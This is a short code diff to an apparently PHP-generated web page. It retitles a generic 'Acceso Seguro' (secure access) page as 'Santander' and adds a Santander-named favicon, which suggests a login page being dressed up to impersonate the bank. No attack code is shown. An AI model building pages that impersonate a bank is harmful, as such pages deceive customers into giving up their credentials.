@@ -59,7 +59,8 @@ ob_end_clean();
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Acceso Seguro</title>
+    <link rel="icon" href="faviconsanta.ico" type="image/svg+xml" data-next-head=""/>
+    <title>Santander</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <style>
         body { 
